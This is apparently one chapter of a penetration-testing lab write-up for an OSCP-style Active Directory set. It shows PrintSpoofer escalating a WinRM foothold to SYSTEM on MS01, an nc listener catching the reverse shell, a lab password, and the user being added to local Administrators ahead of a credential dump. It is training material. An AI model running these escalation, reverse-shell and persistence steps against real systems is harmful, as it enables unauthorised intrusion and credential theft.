# 08 — MS01: SYSTEM, and the local-admin add

> **Pass 3 — `10.10.131.0/24`.** Chapters 01–06 document a different position on the same
> directory (`10.10.152.0/24`), where MS02 was the target and every local path closed. This
> chapter starts from the position that finished the set: MS01 first, then the internal network.

---

## 8.1 Where this pass sits

The set was re-instantiated on a new range. The shape is the one from the `oscp.exam` page
(MS01 dual-homed, everything else behind it), not the direct-DC shape of pass 2:

| Host | Kali-facing | Internal | Note |
|---|---|---|---|
| MS01 | `192.168.131.147` | `10.10.131.147` | dual-homed member server |
| MS02 | — | `10.10.131.148` | reachable only through MS01 |
| DC01 | — | `10.10.131.146` | reachable only through MS01 |
| Kali | `192.168.45.158` | — | sees MS01 only |

The foothold is the known one: WinRM as `OSCP\eric.wallows` with `EricLikesRunning800`. Unlike
`celia.almeda` on MS02, this token holds **`SeImpersonatePrivilege`** — which is the whole
difference between the two positions. This run does not include a `whoami /priv` of its own; the
privilege is the one PrintSpoofer reports finding, one step below.

That privilege is the escalation primitive pass 2 did not have. It does not need a vulnerable
service, a writable path, or a misconfigured ACL — only a process that can be made to
authenticate to a named pipe we control.

---

## 8.2 PrintSpoofer

```powershell
.\PrintSpoofer64.exe -i -c reverse
```

```
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
```

`-i` asks for an interactive window and `-c reverse` runs the staged `reverse` payload (a
previously generated reverse shell) as the impersonated user. On Kali:

```bash
rlwrap -cAr nc -lvnp 4444
```

```
listening on [any] 4444 ...
connect to [192.168.45.158] from (UNKNOWN) [192.168.131.147] 54968
Microsoft Windows [Version 10.0.19044.2251]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

The shell is SYSTEM by construction: PrintSpoofer convinces the Print Spooler to connect to its
named pipe, impersonates the spooler's token, and calls `CreateProcessAsUser()`. The capture does
not include a `whoami` in that window, but the group change below only succeeds with
administrative rights — which is the practical proof.

The technique itself is written up in full on the [`oscp.exam` page](../ad-oscp-exam/03-privilege-escalation.md);
here it is only the way in.

---

## 8.3 The change that makes the dump possible

```cmd
net localgroup administrators /add Eric.Wallows
```

```
The command completed successfully.
```

This looks like a throwaway step. It is the step that turns the WinRM foothold into a remote
credential dump:

- `eric.wallows` authenticated over WinRM with a **network logon** and a medium-integrity token.
  That token is not a local administrator's, so it cannot read `SAM` or `SECURITY` over SMB.
- Adding the account to `BUILTIN\Administrators` gives the *next* logon an administrative token,
  which is what `impacket-secretsdump` needs for remote registry access.
- The alternative is to run a dump tool from the SYSTEM shell on the host itself. The group add
  is cheaper and leaves the tooling on Kali.

It is also a persistent change to the target. In a real engagement it is reverted at cleanup with
`net localgroup administrators /delete Eric.Wallows`; this capture does not show the revert.

---

## 8.4 A detour worth recording

The first two dump attempts were typed into the Windows shell:

```cmd
C:\Users\eric.wallows\AppData\Local\Temp>impacket-secretsdump 'Eric.Wallows':'EricLikesRunning800'@192.168.196.147
'impacket-secretsdump' is not recognized as an internal or external command,
operable program or batch file.
```

`impacket-secretsdump` is a Kali console script. It does not exist on Windows, and prefixing it
with `.\` does not create it. The dump has to run from Kali against `192.168.131.147` — which is
the next chapter.

---

## 8.5 Position after this chapter

| Item | State |
|---|---|
| MS01 shell | SYSTEM (PrintSpoofer) |
| `eric.wallows` | now in `BUILTIN\Administrators` |
| Credential access | remote `SAM` / `SECURITY` as an administrator |
| MS02 / DC01 | untouched — still behind the pivot |

The host is owned. The question is no longer *how to escalate* but *what the registry keeps* —
and on a member server that administrators log on to, that is usually more than LSASS shows.
